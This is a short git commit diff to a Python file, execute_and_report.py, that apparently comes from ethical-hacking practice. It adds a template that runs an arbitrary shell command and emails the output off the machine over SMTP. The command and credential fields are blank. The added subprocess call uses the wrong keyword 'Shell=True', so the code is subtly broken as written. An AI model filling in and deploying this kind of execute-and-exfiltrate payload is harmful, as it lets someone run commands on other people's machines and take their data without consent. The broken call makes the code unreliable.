ce4abdef130843159d52350f25e1d19789fbd924
jean_kali <jeanandrewfuentes@gmail.com>
2020-03-16 05:52:53 -0400

    Finalize execute template

--- execute_and_report.py
+++ execute_and_report.py
@@ -8,3 +8,11 @@ def send_mail(email, password, message):
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()
+
+command = ""
+result = subprocess.check_output(command, Shell=True)
+
+email = ""
+password = ""
+
+send_mail(email, password, result)
